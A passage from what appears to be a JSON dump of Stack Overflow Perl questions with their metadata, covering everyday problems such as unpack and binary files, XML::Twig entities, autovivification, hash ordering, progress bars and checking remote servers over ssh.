$communicationsFile);\n\n        while (&lt;MYFILE&gt;){\n            chomp;\n            if ($_ eq $buildValue){\n                $winBuild=\"1\";\n            }\n\n            sleep($sleepTime);\n        }\n\n        close(MYFILE);\n    }\n} \n</code></pre>\n\n<p>Could anyone tell me what's going on?</p>\n\n<p>Thanks!</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":6,"view_count":38,"score":-6,"question_id":13285597,"title":"need convert Base64 encode without using module","body":"<p>I need convert Base64 encode foramt without using moudle. Becuase I have create some CGI files. I need internal somet text convert Base64 format without using <strong>MIME::Base64</strong>. How can I convert useing by basic perl code? </p>\n\n<p>I tried:</p>\n\n<pre><code>use MIME::Base64;\nopen(IN, \"sample.html\");\nopen(out, \"&gt;output.xhtml\");\nmy $text = join '', &lt;IN&gt;;\n$text =~ s/(src|href)=\"([^http|^www][^\"]+)\"/\"$1=\\\"\".encode_base64($2).'\"'/esgi;\nprint out $text;\n</code></pre>\n\n<p>It work well, but I can't convert this by simple perl code. If any ideas..</p>\n"},{"tags":["perl","file","for-loop","overwrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":40,"score":-1,"question_id":13284801,"title":"perl file overwriting itself in loop","body":"<p>So I have a loop where I am printing out values to a file. The only problem is, I only ever get the last print of the loop. For example, if this were what is being printed in my loop:</p>\n\n<pre><code>1 1\n2 2 \n3 3\n</code></pre>\n\n<p>All my file would have would be <code>3 3</code> as the first and only line. Here is my code:</p>\n\n<pre><code>open my $f, '&gt;', 'file.txt';\n\n#$node_id set above somewhere...\nfor my $key (keys %{$todo-&gt;{$node_id}-&gt;{'urls_hash'}}) { \n    print $f \"$node_id $todo-&gt;{$node_id}-&gt;{'urls_hash'}-&gt;{$key}-&gt;{'domain_id'}\\n\";\n}\n\nclose $f;\n</code></pre>\n\n<p>I've tried using <code>$| = 1</code> to flush, but that didin't seem to do anything. I was hoping maybe someone had run into this before. And sorry for the hash of hash of...etc. I know it's messy :)</p>\n"},{"tags":["perl","hash","duplicates"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":3,"view_count":48,"score":-2,"question_id":13266871,"title":"How to keep a counter for removed duplicates inside a hash value?","body":"<pre><code>chdir(\"c:/perl/normalized\");\n$docid=0;\nuse List::MoreUtils qw( uniq );\nmy %hash = ();\n@files = &lt;*&gt;;\nforeach $file (@files) \n  {\n    $docid++;\n    open (input, $file);    \n    while (&lt;input&gt;) \n      {\n    open (output,'&gt;&gt;c:/perl/postinglist/total');\n    chomp;\n    (@words) = split(\" \");  \n    foreach $word (@words)\n    {\n    push @{ $hash{$word} }, $docid;\n\n    }\n      }\n   }\nforeach $key (sort keys %hash) \n{\n    $size = scalar (@{$hash{$key}});    \n    print output \"Term: $key,   Frequency:$size,    Document(s):\", join(\" \", uniq @{ $hash{$key} }), \"\\n\";\n}\n\n\nclose (input);\nclose (output);\n</code></pre>\n\n<p>before the <code>join(\" \", uniq @{ $hash{$key} })</code> the output was as follows:</p>\n\n<pre><code>Term:of Frequency:35  Document(s): 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 3 3 4 4 4 4 5 6 6 7 7 7 7 7 7 7 7 7\n</code></pre>\n\n<p>Documents shows where was the the frequency distributed</p>\n\n<pre><code>Term:of Frequency:35  Document(s):1 2 3 4 5 6 7\n</code></pre>\n\n<p>which is fine until here... how ever I want to keep a counter for the remove duplicates and such my new output would be</p>\n\n<pre><code>Term:of Frequency:35  Document(s) of: 1(10) 2(7) 3(2) 4(4) 5(1) 6(2) 7(9)\n</code></pre>\n\n<p>that is value(counter)</p>\n"},{"tags":["perl","unpack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13283612,"title":"Perl unpack and newline character","body":"<p>I am using the unpack function to convert the contents of a binary file to hexadecimal.</p>\n\n<p>I am doing it as follows:</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $input=$ARGV[0];\n\nopen(INPUT,'&lt;',$input) || die(\"Couldn't open the file, $input with error: $!\\n\");\nmy $value=&lt;INPUT&gt;;\n$value=unpack(\"H*\",$value);\n\nprint $value,\"\\n\";\n</code></pre>\n\n<p>This prints the contents of the binary input file as a hex string.</p>\n\n<p>However, the issue is that, while parsing the contents of the binary file, if it comes across the byte 0xa (newline character), unpack function stops at that point.</p>\n\n<p>As a result of this, I get the incomplete output in $value variable.</p>\n\n<p>Few examples:</p>\n\n<pre><code>65 2E 0D 0D 0A 24 00 00 00 00 00 00 00 BA DC 95 DC FE BD\n\nFE FF FF FF 07 00 00 00 08 00 00 00 09 00 00 00 0A 00 00 00 0B 00 00 00 0C 00\n</code></pre>\n\n<p>All the content after the byte, 0xa is not parsed by unpack.</p>\n\n<p>So, is there a way to use unpack for the complete binary file so that it does not stop parsing once it encounters a new line character?</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","xml-twig"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13282680,"title":"Escape entity in xml files","body":"<p>I am convert xml to xml file, I try to convert text as for source. I am currently using xml::Twig and I need output without any change in xml. </p>\n\n<p>I Tried:</p>\n\n<p>xml:</p>\n\n<pre><code>&lt;book&gt;\n&lt;book-meta&gt;\n&lt;book-id pub-id-type=\"doi\"&gt;98568&lt;/book-id&gt;\n&lt;copyright-statement&gt;Copyright &amp;#x00A9; 1999 Relati&lt;/copyright-statement&gt;\n&lt;imprint-text type=\"PublisherInfo\"&gt;This edition published in the Taylor &amp;#x0026; 2002.&lt;/imprint-text&gt;\n&lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>Script:</p>\n\n<pre><code>use strict;\nuse XML::Twig;\nuse XML::Xpath;\nopen(my $output , '&gt;', \"Output.xml\") || die \"can't open the Output $!\\n\";\nmy $xml_twig_content = XML::Twig-&gt;new(\ntwig_handlers =&gt; {\nkeep_atts_order =&gt; 1,\nkeep_encoding =&gt; 1,\n},\npretty_print =&gt; 'indented',\n);\n$xml_twig_content-&gt;parsefile('sample.xml');\n$xml_twig_content-&gt;print($output);\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>&lt;book&gt;\n&lt;book-meta&gt;\n&lt;book-id pub-id-type=\"doi\"&gt;98568&lt;/book-id&gt;\n&lt;copyright-statement&gt;Copyright Â© 1999 Relati&lt;/copyright-statement&gt;\n&lt;imprint-text type=\"PublisherInfo\"&gt;This edition published in the Taylor &amp;amp; 2002.&lt;/imprint-text&gt;\n&lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>I need output:</p>\n\n<pre><code>&lt;book&gt;\n&lt;book-meta&gt;\n&lt;book-id pub-id-type=\"doi\"&gt;98568&lt;/book-id&gt;\n&lt;copyright-statement&gt;Copyright &amp;#x00A9; 1999 Relati&lt;/copyright-statement&gt;\n&lt;imprint-text type=\"PublisherInfo\"&gt;This edition published in the Taylor &amp;#x0026; 2002.&lt;/imprint-text&gt;\n&lt;/book-meta&gt;\n&lt;/book&gt;\n</code></pre>\n\n<p>How can i need as source without any changes.</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13281857,"title":"Finding a sequence in a string of characters and printing it out along with characters following it","body":"<p>I am trying to create a program in Perl that will read through thousands of characters that and attempt to find a matching string of characters. I need to print out the string plus the next five letters. I also need to print out the location of where it was found, i.e. how many letters in. I am pretty new to Perl. I'm just learning it in class now.</p>\n\n<p>Here is the code I have so far:</p>\n\n<pre><code>#!/usr/bin/perl\n\n$sequence = 'abcd';\n$fileName = 'file.txt';\n\n#Opening file\nunless (open(fileName, $fileName)) {\n    print \"Cannot open file.\";\n    exit;\n}\n@tempArr = &lt;fileName&gt;;    #Adding the lines to an array\nclose fileName;           #closing the file\n$characters = join('', @tempArr);    #making it a clean string\n$characters =~ s/\\s//g;               #removing white lines\nif (characters =~ m/$sequence/i) {\n\n    #Print $sequence and next five characters\n}\nelse {\n    print \"Does not contain the sequence.\";\n}\n\nexit;\n</code></pre>\n\n<p>file.txt will look like:</p>\n\n<pre><code>aajbkjklasjlksjadlasjdaljasdlkajs\naabasdajlakjdlasdjkalsdkjalsdkjds\naskdjakldamwnemwnamsndjawekljadsa\nabcassdadadfaasabsadfabcdhereeakj\n</code></pre>\n\n<p>I need to print out the \"abcdheree\"</p>\n"},{"tags":["linux","perl","scripting"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13278738,"title":"Perl script to check remote server for process","body":"<p>I am having a bit of a problem with a script that I setup. A little background:</p>\n\n<p>The function of the script is to read from a list of servers that is in a text file separated by :: , log on to the servers, check to see that mysql is running and report back. The file is configured such that each line has:   Servername::Ip address::port number  </p>\n\n<p>The problem I am having is that I think perl is trying to concatenate the ip address that I am feeding to the function I have in the code. Can anyone point my in the right direction?</p>\n\n<pre><code>#!/usr/bin/perl                                                                                           \n\nuse strict;\nuse warnings;\n\nopen(FH, '&lt;', 'serverlist_test') or error(\"Cannot open file , ($!)\");\nwhile (my $line = &lt;FH&gt;) {\n    our ($name, $ip, $port) = split(/::/, $line);\n    my $version = &amp;MySQL_check($ip, $port);                                                                                    \n}\nclose FH;\n\nsub MySQL_check {\n\n    my $issue = `ssh -t root@\"$_[0]\" -p$\"_[1]\" 'ps axco command | grep -i mysql'`;\n    print $issue;\n    if ($issue =~ /mysql/) {                                                                             \n      return \"Mysql found\"; \n    } else {                                                                                             \n       return \"Mysql not found\";                                                                         \n    }                                                                                                    \n}\n</code></pre>\n\n<p>What am I doing wrong?</p>\n\n<p>Thank You.</p>\n"},{"tags":["perl","mojolicious","mojolicious-lite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":24,"score":-1,"question_id":13272220,"title":"Mojolicious lite how to redirect for not found and server error pages to user defined error page","body":"<p>How to redirect user defined error page for not found and server error pages to user define page Mojolicious lite</p>\n"},{"tags":["perl","xor","unpack"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":13281452,"title":"Hexadecimal Computations in Perl","body":"<p>I have a string of ASCII characters. I convert this to hex string using the unpack function.</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $str=\"hello\";\nmy $value=unpack(\"H*\",$str);\n\nprint $value,\"\\n\";\n\n**output:** 68656c6c6f\n</code></pre>\n\n<p>Now, lets say, I want to use this output as a string of hex bytes, read one byte at a time and perform some computation on it and store the output in another variable.</p>\n\n<p>For instance,</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $str=\"hello\";\nmy $value=unpack(\"H*\",$str);\n\nmy $num=0x12;\nmy $i=0;\n\nwhile($i&lt;length($value))\n{\n    my $result.=(substr($value,$i,2)^$num);\n    $i+=2;\n}\n\nprint $result,\"\\n\";\n\n**output:**\n\nArgument \"6c\" isn't numeric in bitwise xor (^) at test.pl line 13.\nArgument \"6c\" isn't numeric in bitwise xor (^) at test.pl line 13.\nArgument \"6f\" isn't numeric in bitwise xor (^) at test.pl line 13.\n8683202020\n</code></pre>\n\n<p>The output is incorrect and also there are several warnings.</p>\n\n<p>If we take the first hex byte of the string, \"hello\" as an example:</p>\n\n<pre><code>68 xor 12 = 7A\n</code></pre>\n\n<p>However, the output shows it as 86. The output is incorrect and also I am not sure how \nit got an output of 86.</p>\n\n<p>What is the right way to do it?</p>\n"},{"tags":["perl","sorting","hash"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":61,"score":5,"question_id":13281195,"title":"Sorting a hash from the first key to the last (Perl)","body":"<p>I have the following hash, and I wish to keep it in the order I've set it in; is this even possible? If not, do any alternatives exist?</p>\n\n<pre><code>my %hash = ('Key1' =&gt; 'Value1', 'Key2' =&gt; 'Value2', 'Key3' =&gt; 'Value3');\n</code></pre>\n\n<p>Do I need to write a custom sorting subroutine? What are my options?</p>\n\n<p>Thank you!</p>\n"},{"tags":["perl","autovivification"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":62,"score":3,"question_id":13279349,"title":"How to nonvivificate in Perl","body":"<p>Let's say I have a Perl script that does:</p>\n\n<pre><code>my $hash = {};\n$hash-&gt;{'a'} = {aa =&gt; 'b'};\n$hash-&gt;{'b'} = undef;\n\nfor (qw(a b c)) {\n    if(defined $hash-&gt;{$_}-&gt;{aa})\n    {\n        say \"defined $_\";\n    }\n    else\n    {\n        say \"undef $_\";\n    }\n}\nprint Dumper $hash;\n</code></pre>\n\n<p>But my output autocreates 'c', which I don't want.</p>\n\n<pre><code>defined a\nundef b\nundef c\n$VAR1 = {\n      'c' =&gt; {},\n      'a' =&gt; {\n               'aa' =&gt; 'b'\n             },\n      'b' =&gt; {}\n    };\n</code></pre>\n\n<p>Also my distribution does not allow me to disable autovivification. is there a way to make a subroutine that checks each level?</p>\n"},{"tags":["regex","perl","escaping"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":13279138,"title":"Trouble escaping dollar sign in Perl","body":"<p>I'm getting a bunch of text from an outside source, saving it in a variable, and then displaying that variable as part of a larger block of HTML. I need to display it as is, and dollar signs are giving me trouble. </p>\n\n<p>Here's the setup:</p>\n\n<pre><code># get the incoming text\nmy $inputText = \"This is a $-, as in $100. It is not a 0.\";\n\nprint &lt;&lt;\"OUTPUT\";\nbefore-regex: $inputText\nOUTPUT\n\n# this regex seems to have no effect\n$inputText =~ s/\\$/\\$/g;\n\nprint &lt;&lt;\"OUTPUT\";\nafter-regex:  $inputText\nOUTPUT\n</code></pre>\n\n<p>In real life, those <code>print</code> blocks are much larger chunks of HTML with variables inserted directly.</p>\n\n<p>I tried escaping the dollar signs using <code>s/\\$/\\$/g</code> because my understanding is that the first <code>\\$</code> escapes the regex so it searches for <code>$</code>, and the second <code>\\$</code> is what gets inserted and later escapes the Perl so that it just displays <code>$</code>. But I can't get it to work.</p>\n\n<p>Here's what I'm getting:</p>\n\n<pre><code>before-regex: This is a 0, as in . It is not a 0.\nafter-regex:  This is a 0, as in . It is not a 0.\n</code></pre>\n\n<p>And here's what I want to see:</p>\n\n<pre><code>before-regex: This is a 0, as in . It is not a 0.\nafter-regex:  This is a $-, as in $100. It is not a 0.\n</code></pre>\n\n<p>Googling brings me to <a href=\"http://stackoverflow.com/q/9716443/324625\">this question</a>. When I try using the array and for loop in the answer, it has no effect.</p>\n\n<p>How can I get the block output to display the variable exactly as it is?</p>\n"},{"tags":["asp.net","perl","authentication","ssh"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13278375,"title":"ssh authentication from .NET webpage to Unix is not working","body":"<p>My .NET website invokes a perl script to perform GIT operations on Gerrit server running UBuntu. In the perl script I connect using passwordless authentication to Gerrit server as below:</p>\n\n<p>system ( \"ssh gitadmin@gerritserver.com 'cd /xyz &amp;&amp; git clone xxx' \");</p>\n\n<p>I verified that ssh authentication is set up correctly between windows client and Unix server. This script works well from windows command prompt but when run from the context of website the page hangs at the ssh command execution. I have ensured that the user account the website and application pool are running under is the same as the user account ssh authentication is set-up for. Any idea why ssh is unable to authenticate from the website? Please suggest any alternatives, if any. I have been looking into password-specific authentication using ssh and host-based authentication. Is host-based authentcation possible between windows client and unix server?</p>\n\n<p>Thanks.</p>\n"},{"tags":["windows","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":13276988,"title":"how to close the current browser window completely before opening the browser using perl","body":"<p>Here @links array consists of various URLs. According to the below code, first www.google.com is opened in firefox. then while entering the forloop, firefox gets killed;the first URL in the @links array is opened. the second URL is getting opened in a new tab while entering the forloop for the second time and after that the browser is getting killed. But i need to first kill firefox everytime it enters the forloop and then the URL should be opened in a new browser window. kindly help.</p>\n\n<pre><code>system(\"start https://www.google.com\");\n\nfor($i=0;$i&lt;@links;$i++)\n{\n    system(\"taskkill /im firefox.exe\");\n    system(\"start $links[$i]\");\n}\n</code></pre>\n"},{"tags":["ruby","string","perl","split"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":1,"view_count":92,"score":5,"question_id":13273318,"title":"Empty strings at the beginning and end of split","body":"<p>In Ruby, when I split a string with a delimiter that matches the beginning of the string, it gives an empty string in the initial position of the array:</p>\n\n<pre><code>\"abc\".split(/a/) # =&gt; [\"\", \"bc\"]\n</code></pre>\n\n<p>but when I do a similar thing with a delimiter that matches the end of the string, it does not give an empty string:</p>\n\n<pre><code>\"abc\".split(/c/) # =&gt; [\"ab\"]\n</code></pre>\n\n<p>This looks inconsistent to me. Is there any rationale for such specification?</p>\n\n<p><strong>Edit</strong>\nIf it is to be compatible with Perl's specification as in muu is to short's answer, then the question remains the same: Why is it like that in Perl? And for this reason, now it also becomes a question about Perl.</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13268535,"title":"perl sed escaping quantifiers from a regex","body":"<p>Having trouble removing quantifiers and meta characters from a regex with sed.\nTo complicate matters the code is intended to be used within a eval.</p>\n\n<pre><code>$word_check = \"about\\s*[\\w\\s]+\";\n$word_check =~ s/\\\\\\[.+\\\\\\]//g;\n$$word_count[$#$word_count + 1] += () = $word_check =~ /(\\w+)\\s*/g;\n</code></pre>\n\n<p>Word_check is a copy of a regex. Want to reduce the regex to only the words it is to\nmatch. Using a regex to do so. Then count the words and save the result in a array.\nThe reason behind the choice is the regex is apart of several and when working with \na match ($&amp;) the words are removed. From a eval. The code below is intended as a string.</p>\n\n<pre><code>for ( my \\$i = 0; \\$i &lt; \\$\\$ref_word_count[\\$R]; \\$i++ ) {\n    \\$temp_str =~ s/^\\\\w+\\\\s*//;\n}\n</code></pre>\n\n<p>OK  Found the answer. Just needed to break up the sed statement some and see the square brackets as a character alone.</p>\n\n<pre><code>$word_check =~ s/i$//;\n$word_check =~ s/[\\.\\+]//g;\n$word_check =~ s/\\\\[sdwSWD]//g;\n$word_check =~ s/[[]//g;\n$word_check =~ s/[]]//g;\n$word_check =~ s/[*]//g;\n$word_check =~ s/[?]//g;\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":13273964,"title":"Speed up foreach loop in perl","body":"<p>I have a working perl script that scans a directory and uses imgsize \n<a href=\"http://dktools.sourceforge.net/imgsize.html\" rel=\"nofollow\">http://dktools.sourceforge.net/imgsize.html</a> to get the width, etc of png files.  Does anyone have any tips for speeding up this process (right now, it averages 5 minutes for every 1000 files)?  I was just wondering if the code could be optimized some how.  Thanks.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse File::Find;\n\nmy @files;\nmy $directory = '/Graphics/';\nmy $output_file = '/output_file';\nmy $max_height = 555;\nmy $count = 0;\n\nopen ( OUTPUT, '&gt;&gt;', $output_file );\n\nfind( \\&amp;wanted, $directory );\n\nforeach my $file ( @files ) {\n        if ( $file =~ /\\.png$/ ) {\n                my $height = `imgsize $file | cut -d\\'\\\"\\' -f4`;\n                if ( $height &gt; $max_height ) {\n                        print OUTPUT \"$file\\n\";\n                }\n\n                $count++;\n\n                my $int_check = $count/1000;\n                if ( $int_check !~ /\\D/ ) {\n                        print \"processed: $count\\n\";\n                }\n        }\n}\n\nprint \"total: $count\\n\";\nclose ( OUTPUT );\nexit;\n\nsub wanted {\n  push @files, $File::Find::name;\n  return;\n}\n</code></pre>\n\n<hr>\n\n<p><strong>Solution</strong>: Turns out that I was able to use the <code>Image::Info</code> module.  I went from processing 1000 imgs every 5 minutes to every <strong>12 seconds</strong>.  Here's the relevant snippet of code, if anyone is interested:</p>\n\n<pre><code> use Image::Info qw(image_info);\n\n    foreach my $file ( @files ) {\n            if ( $file =~ /\\.png$/ ) {\n                    my $output = image_info($file);\n                    my $height = ${$output}{height};\n\n                    if ($height &gt; $max_height) {\n                            print OUTPUT \"$file\\n\";\n                    }\n\n                    $count++;\n\n                    my $int_check = $count/1000;\n                    if ( $int_check !~ /\\D/ ) {\n                            print \"processed: $count\\n\";\n                    }\n            }\n    }\n</code></pre>\n"},{"tags":["perl","text","formatting"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":13271974,"title":"How to format output in Perl?","body":"<p>I have a Perl code responsible for formatting output. Problem is I need to calculate correct number of tabs to be put before one particular character in each string (let's say it's /). So instead of getting  lines with different lengths I'd like to get fixed-length strings (but as short as possible, using the longest as max). How should I approach this? </p>\n\n<p>Example of output (with format commented out, just raw array):</p>\n\n<blockquote>\n<pre><code>Long title with some looong words / short text\nAnother title / another short text\n</code></pre>\n</blockquote>\n\n<p>I need it like this:</p>\n\n<pre><code>title with some looong words / short text\nDifferent title              / another short text\n</code></pre>\n\n<p>This was my first attempt, but it didn't involve using tabs after one particular character.</p>\n\n<pre><code>my $text = Text::Format-&gt;new;\n\n$text-&gt;rightAlign(1);\n$text-&gt;columns(65);\n$text-&gt;tabstop(4);\n\n$values[$i] = $text-&gt;format(@values[$i]);\n</code></pre>\n"},{"tags":["perl","bash","perl-module"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13275288,"title":"How do you prevent perl from making a dump file?","body":"<p>Currently I am running several scripts which are in a experimental testing stage. Unfortunately they crash on occasion and generate large \"core-perl-11-544-546-27320-1xxxxxxx\" perl core dump files.</p>\n\n<p>I want to ensure that if in the future these files crash again, they do not generate perl dump files, or the files size of the dump is limited. </p>\n\n<p>Right now there are some scripts checking for Perl core dump files and removing them if they are greater than a set size, but this is an obvious band-aid on a broken knee. </p>\n\n<p><strong>How might I go about limiting the size of the perl dump file, or preventing one from being made?</strong></p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13260673,"title":"Pb installing Date::Manip with cpan","body":"<p>I am struggling for one day installing date: with cpan (I am using os x). I always get this message </p>\n\n<pre><code>Warning: prerequisite Test::Inter 0 not found.\nBareword found where operator expected at ./Makefile.PL line 1, near \"30 mtime\"\n    (Missing operator before mtime?)\nNumber found where operator expected at ./Makefile.PL line 2, near \"30\"\n    (Missing semicolon on previous line?)\nBareword found where operator expected at ./Makefile.PL line 2, near \"30 atime\"\n    (Missing operator before atime?)\nNumber found where operator expected at ./Makefile.PL line 3, near \"30\"\n    (Missing semicolon on previous line?)\nBareword found where operator expected at ./Makefile.PL line 3, near \"30 ctime\"\n    (Missing operator before ctime?)\nERROR from evaluation of /Users/mehdibenchoufi/.cpan/build/SBECK-QEN4kY/Date-Manip-6.36/Makefile.PL: ERROR from evaluation of /Users/mehdibenchoufi/.cpan/build/SBECK-QEN4kY/Date-Manip-6.36/PaxHeaders.11917/Makefile.PL: syntax error at ./Makefile.PL line 1, near \"30 mtime\"\nWarning: No success on command[/opt/local/bin/perl5.12 Makefile.PL]\n'YAML' not installed, will not store persistent state\n  SBECK/Date-Manip-6.36.tar.gz\n  /opt/local/bin/perl5.12 Makefile.PL -- NOT OK\nRunning make test\n  Make had some problems, won't test\nRunning make install\n  Make had some problems, won't install\nFailed during this command:\n SBECK/Date-Manip-6.36.tar.gz                 : writemakefile NO '/opt/local/bin/perl5.12 Makefile.PL' returned status 65280\n</code></pre>\n\n<p>Does anyone knows how to debug ?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13274385,"title":"using cpan with 2 installed perl","body":"<p>I have 2 perl installed</p>\n\n<pre><code>/usr/bin/perl\n</code></pre>\n\n<p>and</p>\n\n<pre><code>/usr/local/perls/perl-5.16.2/bin/perl\n</code></pre>\n\n<p>I am using</p>\n\n<pre><code>cpan -i Compress::Zlib installs\n</code></pre>\n\n<p>to install perl modules</p>\n\n<p>What to do to have perl modules installed for <code>/usr/local/perls/perl-5.16.2/bin/perl</code> (using <code>cpan -i</code>) since by default <em>cpan -i</em> installs perl modules in <code>/usr/bin/perl</code> ?</p>\n\n<p>Thank you</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":41,"score":2,"question_id":13273594,"title":"Print progress bar for a script with real time update","body":"<p>In my script I check for the existence of elements compared to a set of data that I already have, I do this multiple time, hence the progress bar.</p>\n\n<p>This is what I am doing as of now</p>\n\n<pre><code>### A loop which is done multiple times ### \n\nmy $i =1;\nmy $page = 50;\nwhile ($i &lt;= $page)    \n{\n\n##### Part where I print my progress bar ######\nprint \"\\rProgress:[\";\nmy $completed =($i/$page)*100;\n$completed = ceil($completed);\nmy $l= $completed;\nwhile ($l&gt;0){\n    print \"#\";\n    $l--;\n}   \nmy $remaining = 100-$completed;\nwhile ($remaining&gt;0){\n    print \" \";\n    $m--;\n} \nprint \"] \";\nprint $completed . \"% Complete\";\n\n\n######### Part where I check and keep count #############\nforeach (@each_job) \n{\n    my $temp = $_;\n    # Count number of jobs that exist with my set\n    if ($job{\"$temp\"} == 1) \n    { \n        $does_exist++ ;\n        ## print \"\\n Exists - $does_exist\"; #Confused for this print\n    }\n    else \n    {\n        $does_not_exist++;\n        ## print \"\\n Does not exist - $does_not_exist\"; #Confused for this print\n    };\n    };\n    $i++;\n}\n</code></pre>\n\n<p>So what I currently get is something like </p>\n\n<pre><code>Progress:[################################################                                                    ] 48% Complete\n</code></pre>\n\n<p>Which works fine and displays the progress bar as a traverse page by page.\nBut what I want is something like this -</p>\n\n<pre><code>Progress:[################################################                                                    ] 48% Complete\nExists - 3\nDoes Not Exist - 5\n</code></pre>\n\n<p>Which keeps getting updated at the same spot (using <code>\\r</code>). \nCan someone help me ? </p>\n"},{"tags":["xml","perl","compiler-errors","xmlwriter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13273345,"title":"Trouble writing to xml using Perl","body":"<p>Bellow you can find the script that I am writing. My question is below the the script.</p>\n\n<pre><code>use XML::Writer;\nuse IO;\n\n@sortedPLATFORMS = qw(win32_x86 win64_x64 linux_x86 linux_x64 solaris_sparc solaris_sparcv9 aix_rs6000 aix_rs6000_64 hpux_pa-risc hpux_ia64);\n@STARTS = qw(wdf_22_00 wdf_23_00 wdf_00_00 wdf_01_00 wdf_02_00);\n\nmy @waitFors;\n\nmy $thisPlatform;\nmy $thisMachine;\nmy $thisTask;\nmy $thisBuild;\nmy $thisCMD;\nmy $thisWaitFor;\n\n\nforeach my $start(@STARTS)\n{   \n    my $jobFile = \"jobs/$start.txt\";\n    my $doc = new IO::File(\"&gt;$start.xml\", 'w');\n    my $writer = new XML::Writer(OUTPUT =&gt; $doc) or die \"Cannot open file\";\n    $writer-&gt;xmlDecl(\"UTF-8\"); #XML declaration\n    $writer-&gt;startTag(\"$start\");\n\n    if(open(JOB_FILE,$jobFile))\n    {\n    while(&lt;JOB_FILE&gt;)\n    {\n        chomp;\n        s-^\\s+$--;\n        next unless($_);\n        next if(/^\\;/);\n        next if(/\\[config\\]/);\n        next if(/event_dir\\s+\\=\\s+(.+?)$/);\n\n        if(/\\[(.+?)\\]/)\n        {\n            getInfos();\n        }\n        elsif(/^\\s+waitfor\\s+\\=\\s+(.+?)$/)\n        {\n            $thisWaitFor = $1;\n            push(@waitFors, \"$thisWaitFor\");\n        }\n        elsif(/^\\s+command\\s+\\=\\s+(.+?)$/)\n        {\n            $thisCMD = $1;\n            writeXML();\n            @waitFors = ();\n        }       \n    }\n}\nelse\n{\n    print \"something is wrong\";\n}\n\n$writer-&gt;endTag();\n    $writer-&gt;end();\n    $doc-&gt;close();\nclose JOB_FILE;\n}\n</code></pre>\n\n<p>The error that I am getting is:</p>\n\n<pre><code>    Can't call method \"characters\" on an undefined value at createMachineList.pl\n line 96, &lt;JOB_FILE&gt; line 13.\n</code></pre>\n\n<p>Where the method <code>\"characters\"</code> is a <code>$writer-&gt;characters(\"\\n\\n\");</code> line which is from the <code>writeXML()</code> sub.</p>\n\n<p>I understand that there is an undefined value passed to <code>writeXML()</code> but i don't understand why.</p>\n\n<p>Could anybody please shed some light on this issue?</p>\n\n<p>Thank you,\nsSmacKk</p>\n"},{"tags":["perl","svn"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13271881,"title":"SVN access in Perl","body":"<p>I want to write a perl script by which I can checkout/checkin files from SVN repository.<br>\nI checked some Perl modules like <code>Alien::SVN</code>, <code>SVN::Core</code>, <code>SVN::Client</code> etc.</p>\n\n<p>But I could not really find any function which does file checkout or check-in.</p>\n\n<p>Can someone please help?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13270971,"title":"Unable to get correct match start and end offsets","body":"<p>I have a regex as below:</p>\n\n<pre><code>$regex = qr/(?sx-im:(?sx-im:(?:^|(?&lt;=\\n)))(?=(?sx-im:[\\ \\t]*)(?sx-im:(?:^|(?&lt;=\\n))Data\\ and\\ value)(?sx-im:[\\ \\t\\r]*(?:$|\\n))))/;\n</code></pre>\n\n<p>I am matching it against following text:</p>\n\n<pre><code>$text =\"Data and value\";\n</code></pre>\n\n<p>Now I want to get the match-start offset, match-end offset and matched text.</p>\n\n<p>Normally I use <code>@-</code>, <code>@+</code> and <code>$&amp;</code> to get these like below:</p>\n\n<pre><code>if($text  =~ 